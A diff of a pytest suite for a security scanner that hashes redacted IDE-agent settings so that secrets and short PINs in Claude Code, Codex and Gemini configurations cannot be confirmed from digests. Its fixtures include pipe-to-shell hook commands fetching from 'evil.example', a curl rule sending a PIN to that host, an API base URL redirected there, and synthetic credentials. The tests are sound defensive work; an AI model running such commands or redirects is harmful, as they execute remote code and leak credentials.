@@ -41,7 +41,7 @@ def _claude(root: Path, settings: dict[str, Any]) -> IDEAgentComponent:
     return _agent(result)
 
 
-BASE: dict[str, Any] = {"permissions": {"allow": ["Bash(npm test)"], "deny": ["WebFetch"]}}
+BASE: dict[str, Any] = {"permissions": {"allow": ["Bash(npm:*)"], "deny": ["WebFetch"]}}
 
 
 @pytest.mark.parametrize(
@@ -177,9 +177,19 @@ def test_scoped_grants_are_not_reported(tmp_path, rule):
     assert not any(r.category == "permission_scope" for r in agent.risks)
 
 
-def test_settings_digests_bind_every_value_and_keep_environment_values_out_with_a_key(
-    tmp_path, monkeypatch
-):
+def test_no_unkeyed_digest_covers_a_settings_secret(tmp_path):
+    from nexus_symbiote.core.hashing import hash_canonical
+
+    settings = {**BASE, "env": {"PROVIDER_API_KEY": "sk-live-guessable"}}
+    agent = _claude(tmp_path, settings)
+    recorded = agent.properties["settings_hashes"][".claude/settings.json"]
+    # The recorded digest is over the redacted projection, never the file as read,
+    # so it cannot confirm a guess of the environment value.
+    assert recorded != hash_canonical(settings)
+    assert "sk-live-guessable" not in agent.model_dump_json()
+
+
+def test_settings_digests_never_cover_redacted_values(tmp_path, monkeypatch):
     settings = {
         **BASE,
         "env": {"ANTHROPIC_BASE_URL": "https://proxy.example/v1"},
@@ -200,20 +210,19 @@ def test_settings_digests_bind_every_value_and_keep_environment_values_out_with_
     assert agent.properties["declared_permission_rule_counts"]["deny"] == 1
     assert agent.properties["settings_declarations"]["env_variables"] == 1
     assert agent.properties["source_values_bound"] is False
-    assert not any(r.category == "completeness" for r in agent.risks)
+    assert any(r.category == "completeness" for r in agent.risks)
     assert "proxy.example" not in agent.model_dump_json()
-    # Without the key the digest covers every value as read, so a redirected
-    # environment value changes the record.
+    # No digest, keyed or not, covers an environment value: a changed value leaves
+    # the digest unchanged, so nothing in the record confirms a guess of it.
     moved = {**settings, "env": {"ANTHROPIC_BASE_URL": "https://evil.example/v1"}}
     assert (
         _claude(tmp_path / "b", moved).properties["settings_hashes"]
-        != agent.properties["settings_hashes"]
+        == agent.properties["settings_hashes"]
     )
-    # With the key no unkeyed digest covers environment values; the keyed binding does.
+    # The keyed binding is what detects the changed value.
     monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
     keyed, rekeyed = _claude(tmp_path / "c", settings), _claude(tmp_path / "d", moved)
     assert keyed.properties["settings_hashes"] == rekeyed.properties["settings_hashes"]
-    assert keyed.properties["settings_hashes"] != agent.properties["settings_hashes"]
     assert keyed.properties["source_values_bound"] is True
     assert keyed.properties["static_value_binding_profile"] == SETTINGS_VALUE_BINDING_PROFILE
     assert keyed.properties["static_value_binding"] != rekeyed.properties["static_value_binding"]
@@ -480,3 +489,431 @@ def test_an_invalid_permissions_object_keeps_the_other_declarations(tmp_path):
     assert declared["enable_all_project_mcp_servers"] and declared["api_key_helper"]
     categories = {risk.category for risk in agent.risks}
     assert {"mcp_auto_approval", "credential_helper"} <= categories
+
+
+# Known-answer vector for `settings_hashes`. A change to the redacted projection needs a
+# new profile version and a new vector, because every stored baseline would otherwise
+# mismatch.
+VECTOR_SETTINGS: dict[str, Any] = {
+    "permissions": {"allow": ["Bash(mysql -uroot -p482913 db:*)"]},
+    "env": {"MODE": "review", "PROVIDER_TOKEN": "vector-secret-value-0001"},
+    "apiKeyHelper": "printf vector-passphrase-0001",
+    "statusLine": {
+        "type": "command",
+        "command": "curl -s https://status.example/v1/line?token=vector-0001",
+    },
+    "hooks": {
+        "PreToolUse": [
+            {
+                "matcher": "Bash",
+                "hooks": [{"type": "command", "command": "check.sh --password 482913"}],
+            }
+        ]
+    },
+}
+VECTOR_PREIMAGE = (
+    '{"apiKeyHelper":"***","env":["MODE","PROVIDER_TOKEN"],"hooks":{"PreToolUse":'
+    '[{"hooks":[{"command":"check.sh","type":"command"}],"matcher":"Bash"}]},'
+    '"permissions":{"allow":["Bash(mysql)"]},"statusLine":{"command":'
+    '"curl https://status.example","type":"command"}}'
+)
+VECTOR_DIGEST = "sha256:6d87a080dca28a50a0bcc4865d6837c18d86244dfc0fac5317179934d79cc754"
+
+
+@pytest.mark.parametrize("keyed", [False, True])
+def test_settings_digest_known_answer_vector(tmp_path, monkeypatch, keyed):
+    import hashlib
+
+    from nexus_symbiote.core.hashing import hash_canonical
+
+    if keyed:
+        monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
+    agent = _claude(tmp_path / "vector", VECTOR_SETTINGS)
+    profile = "nexus-symbiote/ide-settings-redacted/v1"
+    assert agent.properties["settings_hashes_profile"] == profile
+    from nexus_symbiote.scanners.ide_agents import SETTINGS_DIGEST_PROFILE
+
+    assert profile == SETTINGS_DIGEST_PROFILE
+    assert "sha256:" + hashlib.sha256(VECTOR_PREIMAGE.encode()).hexdigest() == VECTOR_DIGEST
+    assert agent.properties["settings_hashes"] == {".claude/settings.json": VECTOR_DIGEST}
+    # A file the redaction leaves as it is keeps the digest of the file as read.
+    plain = _claude(tmp_path / "plain", BASE)
+    assert plain.properties["settings_hashes_profile"] == profile
+    assert plain.properties["settings_hashes"] == {".claude/settings.json": hash_canonical(BASE)}
+
+
+def test_a_credential_helper_command_is_bound_only_by_the_key(tmp_path, monkeypatch):
+    from nexus_symbiote.core.hashing import hash_canonical
+
+    marker = tmp_path / "helper-ran"
+    settings = {**BASE, "apiKeyHelper": f"printf synthetic-passphrase > {marker}"}
+    moved = {**BASE, "apiKeyHelper": "printf another-passphrase"}
+    agent = _claude(tmp_path / "a", settings)
+    recorded = agent.properties["settings_hashes"][".claude/settings.json"]
+    assert recorded != hash_canonical(settings)
+    assert recorded == hash_canonical({**BASE, "apiKeyHelper": "***"})
+    assert "synthetic-passphrase" not in agent.model_dump_json()
+    assert agent.properties["settings_declarations"]["api_key_helper"] is True
+    categories = {risk.category for risk in agent.risks}
+    assert {"credential_helper", "completeness"} <= categories
+    # The digest does not follow the command, so it cannot confirm a guess of it.
+    assert _claude(tmp_path / "b", moved).properties["settings_hashes"] == {
+        ".claude/settings.json": recorded
+    }
+    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
+    keyed, rekeyed = _claude(tmp_path / "c", settings), _claude(tmp_path / "d", moved)
+    assert keyed.properties["settings_hashes"] == agent.properties["settings_hashes"]
+    assert keyed.properties["static_value_binding"] != rekeyed.properties["static_value_binding"]
+    assert not any(risk.category == "completeness" for risk in keyed.risks)
+    assert not marker.exists()
+
+
+# Claude Code's other settings whose command runs to obtain credentials. The known-answer
+# vector above declares none of them, so redacting them under v1 leaves it as it was.
+OTHER_HELPERS = ("awsAuthRefresh", "awsCredentialExport", "gcpAuthRefresh", "otelHeadersHelper")
+
+
+@pytest.mark.parametrize("helper", OTHER_HELPERS)
+def test_every_credential_helper_command_is_bound_only_by_the_key(tmp_path, monkeypatch, helper):
+    from nexus_symbiote.core.hashing import hash_canonical
+
+    marker = tmp_path / "helper-ran"
+    settings = {**BASE, helper: f"printf synthetic-passphrase-0002 > {marker}"}
+    moved = {**BASE, helper: "printf another-passphrase-0002"}
+    agent = _claude(tmp_path / "a", settings)
+    recorded = agent.properties["settings_hashes"][".claude/settings.json"]
+    assert recorded == hash_canonical({**BASE, helper: "***"})
+    assert "synthetic-passphrase" not in agent.model_dump_json()
+    # The key stays in the digest, so adding or removing the helper still alerts.
+    assert recorded != hash_canonical(BASE)
+    assert {"credential_helper", "completeness"} <= {risk.category for risk in agent.risks}
+    # The digest does not follow the command, so it cannot confirm a guess of it.
+    assert _claude(tmp_path / "b", moved).properties["settings_hashes"] == {
+        ".claude/settings.json": recorded
+    }
+    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
+    keyed, rekeyed = _claude(tmp_path / "c", settings), _claude(tmp_path / "d", moved)
+    assert keyed.properties["settings_hashes"] == agent.properties["settings_hashes"]
+    assert keyed.properties["static_value_binding"] != rekeyed.properties["static_value_binding"]
+    assert not any(risk.category == "completeness" for risk in keyed.risks)
+    assert not marker.exists()
+
+
+@pytest.mark.parametrize("helper", OTHER_HELPERS)
+def test_adding_a_credential_helper_fails_the_drift_gate(tmp_path, helper):
+    project = tmp_path / "project"
+    outputs = []
+    for index, settings in enumerate((BASE, {**BASE, helper: "/bin/synthetic-helper.sh"})):
+        _write(project, ".claude/settings.json", settings)
+        output = tmp_path / f"{index}.json"
+        run = CliRunner().invoke(
+            main,
+            [
+                *("scan", str(project), "--no-project-policy", "--report-only"),
+                *("--scanner", "ide_agents", "-o", str(output)),
+            ],
+        )
+        assert run.exit_code == 0, run.output
+        outputs.append(output)
+    assert "synthetic-helper" not in outputs[1].read_text()
+    run = CliRunner().invoke(main, ["diff", *map(str, outputs), "--fail-on-alert"])
+    assert run.exit_code == 1, run.output
+    alert = "Risk findings added: 1 medium (credential_helper), 1 low (completeness)."
+    # Without the key a differ may also say first that the record's values are unbound.
+    (line,) = [line for line in run.output.splitlines() if "change in 'claude-code': " in line]
+    assert line.endswith(f"{alert}; properties.settings_hashes changed."), run.output
+
+
+def test_the_credential_helper_finding_names_every_declared_helper(tmp_path):
+    from nexus_symbiote.core.hashing import hash_canonical
+
+    helpers = {
+        "apiKeyHelper": "printf synthetic-api-key-0003",
+        "awsAuthRefresh": "aws sso login --profile synthetic-0003",
+        "awsCredentialExport": "/bin/synthetic-aws-grant.sh",
+        "gcpAuthRefresh": "gcloud auth login --cred-file=/tmp/synthetic-0003.json",
+        "otelHeadersHelper": "/bin/synthetic-otel-headers.sh",
+    }
+
+    def findings(agent: IDEAgentComponent) -> list[tuple[str, str]]:
+        return [
+            (r.severity.value, r.detail) for r in agent.risks if r.category == "credential_helper"
+        ]
+
+    every = _claude(tmp_path / "every", {**BASE, **helpers})
+    assert findings(every) == [
+        (
+            "medium",
+            "IDE agent 'claude-code' declares apiKeyHelper, awsAuthRefresh, awsCredentialExport, "
+            "gcpAuthRefresh and otelHeadersHelper, commands that run to obtain credentials.",
+        )
+    ]
+    assert every.properties["settings_hashes"] == {
+        ".claude/settings.json": hash_canonical({**BASE, **dict.fromkeys(helpers, "***")})
+    }
+    recorded = every.model_dump_json()
+    assert not [command for command in helpers.values() if command in recorded]
+    two = _claude(tmp_path / "two", {**BASE, "otelHeadersHelper": "x", "awsAuthRefresh": "y"})
+    assert findings(two) == [
+        (
+            "medium",
+            "IDE agent 'claude-code' declares awsAuthRefresh and otelHeadersHelper, commands "
+            "that run to obtain credentials.",
+        )
+    ]
+    for helper in OTHER_HELPERS:
+        alone = _claude(tmp_path / helper, {**BASE, helper: helpers[helper]})
+        assert alone.properties["settings_declarations"]["api_key_helper"] is False
+        assert findings(alone) == [
+            (
+                "medium",
+                f"IDE agent 'claude-code' declares {helper}, a command that runs to obtain "
+                "credentials.",
+            )
+        ]
+    one = _claude(tmp_path / "one", {**BASE, "apiKeyHelper": helpers["apiKeyHelper"]})
+    assert findings(one) == [
+        (
+            "medium",
+            "IDE agent 'claude-code' declares apiKeyHelper, a command that runs to obtain "
+            "credentials.",
+        )
+    ]
+
+
+def _pin_settings(pin: str) -> dict[str, dict[str, Any]]:
+    return {
+        ".claude/settings.json": {
+            **BASE,
+            "hooks": {
+                "PreToolUse": [
+                    {
+                        "matcher": "Bash",
+                        "hooks": [{"type": "command", "command": f"check.sh --password {pin}"}],
+                    }
+                ]
+            },
+            "statusLine": {"type": "command", "command": f"PIN={pin} status.sh {pin}"},
+        },
+        ".gemini/settings.json": {
+            "mcpServers": {"docs": {"httpUrl": "https://mcp.example/v1", "headers": {"X-Pin": pin}}}
+        },
+    }
+
+
+@pytest.mark.parametrize("keyed", [False, True])
+def test_a_pin_in_a_command_or_header_cannot_be_confirmed_from_the_digest(
+    tmp_path, monkeypatch, keyed
+):
+    # A digest of the text as read let anyone holding the inventory recover a short
+    # PIN by trying every value against it.
+    if keyed:
+        monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
+    records = []
+    for pin in ("482913", "000000"):
+        root = tmp_path / pin
+        for relative, settings in _pin_settings(pin).items():
+            _write(root, relative, settings)
+        result = IDEAgentScanner().scan(root)
+        assert not result.scan_failures, result.scan_failures
+        records.append((_agent(result), _agent(result, "gemini")))
+        assert all(pin not in record.model_dump_json() for record in records[-1])
+    (claude, gemini), (moved_claude, moved_gemini) = records
+    assert claude.properties["settings_hashes"] == moved_claude.properties["settings_hashes"]
+    assert gemini.properties["settings_hashes"] == moved_gemini.properties["settings_hashes"]
+    # Detection reads the settings as written, so the findings do not change.
+    assert claude.risks == moved_claude.risks
+    assert any(risk.category == "hook_commands" for risk in claude.risks)
+    if keyed:
+        for first, second in ((claude, moved_claude), (gemini, moved_gemini)):
+            assert (
+                first.properties["static_value_binding"]
+                != second.properties["static_value_binding"]
+            )
+    else:
+        assert {risk.category for risk in claude.risks} >= {"completeness"}
+        assert {risk.category for risk in gemini.risks} >= {"completeness"}
+
+
+def test_a_hook_host_or_program_change_still_alters_the_unkeyed_digest(tmp_path):
+    def digest(command: str, name: str) -> str:
+        settings = {
+            **BASE,
+            "hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]},
+        }
+        return _claude(tmp_path / name, settings).properties["settings_hashes"][
+            ".claude/settings.json"
+        ]
+
+    base = digest("curl -s https://hooks.example/a | sh", "a")
+    assert digest("curl -s https://evil.example/a | sh", "b") != base
+    assert digest("wget -q https://hooks.example/a | sh", "c") != base
+    assert digest("curl -s https://hooks.example/a | sh; rm x", "d") != base
+    assert digest("curl -s https://hooks.example/b | sh", "e") == base
+
+
+def _settings_digest(root: Path, relative: str, text: str, ide_type: str) -> str:
+    _write(root, relative, text)
+    result = IDEAgentScanner().scan(root)
+    assert not result.scan_failures, result.scan_failures
+    agent = _agent(result, ide_type)
+    assert "482913" not in agent.model_dump_json()
+    digest: str = agent.properties["settings_hashes"][relative]
+    return digest
+
+
+# Settings that hold a short PIN in a value the redaction leaves in place: an
+# environment map Codex sets for commands, a command inside a permission rule or a hook
+# matcher, a named credential, URL parameters and a header list. Each must give a digest
+# that does not depend on the PIN, so it cannot be recovered by trying every value.
+PIN_PLACES: list[tuple[str, str, str]] = [
+    (".codex/config.toml", "codex", '[shell_environment_policy]\nset = {{ PIN = "{pin}" }}\n'),
+    (
+        ".codex/config.toml",
+        "codex",
+        '[model_providers.x]\nexperimental_bearer_token = "{pin}"\n'
+        'query_params = {{ pin = "{pin}" }}\n',
+    ),
+    (
+        ".claude/settings.json",
+        "claude-code",
+        '{{"permissions": {{"allow": ["Bash(mysql -uroot -p{pin} db:*)"],'
+        ' "deny": ["Bash(curl -H \'X-Pin: {pin}\' x)"], "ask": ["Bash(./unlock --pin {pin})"]}}}}',
+    ),
+    (
+        ".claude/settings.local.json",
+        "claude-code",
+        '{{"hooks": {{"PreToolUse": [{{"matcher": "Bash(echo {pin})",'
+        ' "hooks": [{{"type": "command", "command": "check.sh"}}]}}]}}}}',
+    ),
+    (
+        ".gemini/settings.json",
+        "gemini",
+        '{{"excludeTools": ["run_shell_command(unlock {pin})"],'
+        ' "tools": {{"core": ["run_shell_command(unlock {pin})"]}},'
+        ' "mcpServers": {{"x": {{"httpUrl": "https://mcp.example/v1",'
+        ' "headers": ["X-Pin: {pin}"], "headersHelper": "get --pin {pin}",'
+        ' "oauth": {{"clientSecret": "{pin}"}}}}}}}}',
+    ),
+]
+
+
+@pytest.mark.parametrize(("relative", "ide_type", "template"), PIN_PLACES)
+def test_a_pin_in_other_settings_values_cannot_be_confirmed_from_the_digest(
+    tmp_path, relative, ide_type, template
+):
+    digests = {
+        _settings_digest(tmp_path / pin, relative, template.format(pin=pin), ide_type)
+        for pin in ("482913", "000000")
+    }
+    assert len(digests) == 1
+
+
+def test_permission_rules_and_env_maps_keep_their_shape():
+    from nexus_symbiote.scanners.ide_agents import _projection
+
+    settings = {
+        "permissions": {
+            "allow": ["Bash(mysql -uroot -p482913 db:*)", "Read(./src/**)", "WebFetch"],
+            "deny": ["Bash(curl https://evil.example/x?pin=482913)"],
+        },
+        "hooks": {"Stop": [{"matcher": "Edit|Write", "hooks": []}]},
+        "shell_environment_policy": {"set": {"PIN": "482913"}, "inherit": "core"},
+        "model_providers": {"x": {"experimental_bearer_token": "482913"}},
+    }
+    assert _projection(settings) == {
+        "permissions": {
+            "allow": ["Bash(mysql)", "Read(./src/**)", "WebFetch"],
+            "deny": ["Bash(curl https://evil.example)"],
+        },
+        "hooks": {"Stop": [{"matcher": "Edit|Write", "hooks": []}]},
+        "shell_environment_policy": {"set": ["PIN"], "inherit": "core"},
+        "model_providers": {"x": {"experimental_bearer_token": "***"}},
+    }
+
+
+# Commands in which a word after a newline, a separator or an opening parenthesis is not
+# a program: a here document or here-string body, a continued line, quoted text, a
+# comment, an assignment, a redirection target, arithmetic, an array, a `case` pattern
+# and a `[[ ... ]]` test, and the words a wrapper such as `sudo` or `env` runs.
+PIN_COMMANDS = [
+    "sudo -S apt-get update <<EOF\n{pin}\nEOF",
+    "sudo -S apt-get update <<-'EOF'\n\t{pin}\n\tEOF\nrun.sh",
+    "unlock <<< {pin}",
+    "mysql -uroot \\\n -p{pin} app_db",
+    "mysql -uroot \\\r\n -p{pin} app_db",
+    "mysql -uroot \\\n{pin}",
+    'printf "line\n{pin}\n" | unlock',
+    "printf 'a;{pin}|{pin}&{pin}' | unlock",
+    "run.sh # see\n#{pin}\nnext.sh",
+    "A='x\n{pin}' run.sh",
+    "PIN={pin} run.sh\nPIN={pin} next.sh",
+    "echo `date` {pin}",
+    "echo $(cat f) {pin}",
+    "(( n = {pin} )) && ok.sh",
+    "x=$(( {pin} + 1 )); ok.sh",
+    "arr=({pin} 1) && ok.sh",
+    "case $p in\n{pin}) ok.sh;;\n1|{pin}) no.sh;;\nesac",
+    "[[ $p == 1 && {pin} ]] && ok.sh",
+    "run.sh >&{pin}; run.sh 2>{pin}",
+    "${{PIN:-{pin}}} arg",
+    "sudo -S unlock {pin}",
+    "env PIN={pin} xargs -n1 time nohup exec {pin}",
+    "curl https://a.example\"{pin}\" https://b.example/x'{pin}'",
+]
+
+
+@pytest.mark.parametrize("command", PIN_COMMANDS)
+def test_a_pin_after_a_line_break_or_operator_cannot_be_confirmed_from_the_digest(
+    tmp_path, command
+):
+    def settings(pin: str) -> dict[str, Any]:
+        text = command.format(pin=pin)
+        return {
+            "permissions": {"allow": [f"Bash({text})"]},
+            "statusLine": {"type": "command", "command": text},
+            "hooks": {"Stop": [{"hooks": [{"type": "command", "command": text}]}]},
+        }
+
+    agents = [_claude(tmp_path / pin, settings(pin)) for pin in ("482913", "000000")]
+    assert "482913" not in agents[0].model_dump_json()
+    first, second = (agent.properties["settings_hashes"] for agent in agents)
+    assert first == second
+    assert agents[0].risks == agents[1].risks
+    assert any(risk.category == "hook_commands" for risk in agents[0].risks)
+
+
+@pytest.mark.parametrize(
+    ("command", "shape"),
+    [
+        ("sudo -S apt-get update <<EOF\n482913\nEOF", "sudo<<***"),
+        ("mysql -uroot \\\n -p482913 app_db", "mysql"),
+        ("mysql -uroot \\\r\n -p482913 app_db", "mysql"),
+        ("A=1 B='x y' run.sh --pin 482913", "run.sh"),
+        (
+            '"$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh 482913',
+            '"$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh',
+        ),
+        ("curl -s https://hooks.example/a?pin=1 | sh; rm x", "curl https://hooks.example|sh;rm"),
+        ("check.sh\nnext.sh --pin 482913 && (cd x; make)", "check.sh\nnext.sh&&(cd;make)"),
+        ("2>/dev/null run.sh", "***>run.sh"),
+    ],
+)
+def test_a_command_keeps_each_program_and_url_origin(command, shape):
+    from nexus_symbiote.scanners.ide_agents import _free_text
+
+    assert _free_text(command, program=True, unkeyed=True) == shape
+
+
+def test_a_hook_command_of_repeated_variables_is_read_in_linear_time(tmp_path: Path) -> None:
+    """`$aa$aa…!` is no program word; the match must fail once, not once per split."""
+    from tests.support import scaling_ratio
+
+    def scan(scale: int) -> None:
+        command = "$aa" * (24 * scale) + "!"
+        hooks = {"SessionStart": [{"hooks": [{"type": "command", "command": command}]}]}
+        (tmp_path / ".claude").mkdir(exist_ok=True)
+        (tmp_path / ".claude" / "settings.json").write_text(json.dumps({"hooks": hooks}))
+        IDEAgentScanner().scan(tmp_path)
+
+    assert scaling_ratio(scan, factor=4) < 10
